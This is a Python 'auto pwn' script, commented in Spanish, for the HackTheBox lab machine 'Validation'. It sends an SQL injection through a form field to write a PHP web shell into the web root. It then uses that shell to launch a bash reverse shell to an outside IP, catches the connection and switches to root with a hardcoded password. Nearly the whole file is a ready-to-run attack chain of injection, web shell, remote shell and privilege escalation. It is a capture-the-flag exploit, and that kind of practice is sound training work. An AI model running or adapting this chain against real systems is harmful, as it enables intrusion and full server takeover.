#!/usr/bin/python3

# Auto pwn for Validation HTB machine

from pwn import *
import signal, pdb, requests
import sys

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...\n")
  sys.exit(1)

# Ctrl + C
signal.signal(signal.SIG_IGN, def_handler)

if len(sys.argv) != 3:
  log.failure(f"Uso {sys.argv[0]} <ip-address> filename")
  sys.exit(1)

# Variables Globales...
ipAddress = sys.argv[1]
filename = sys.argv[2]
mainUrl = f"http://{ipAddress}/"
lport = 443

def createFile():
  dataPost = {
    'username': 'caca',
    'country': f"""Afganistan' union select "<?php system($_REQUEST['cmd']); ?>" into outfile '/var/www/html/{filename}'-- -"""
  }

  r = requests.post(mainUrl, data=dataPost)

def getAccess():
  dataPost = {
    'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'"
  }

  r = requests.post(f"{mainUrl}{filename}", data=dataPost)
  print(r)

if __name__ == '__main__':
  createFile()
  try:
    threading.Thread(target=getAccess, args=()).start()
  except Exception as e:
    log.error(str(e))

  shell = listen(lport, timeout=20).wait_for_connection()

  if shell.sock is None:
    log.error("No se consiguio una conexion...")
  else:
    shell.sendline("su root")
    time.sleep(2)
    shell.sendline("uhc-9qual-global-pw")
    time.sleep(2)
    shell.sendline("script /dev/null -c bash")

    shell.interactive()


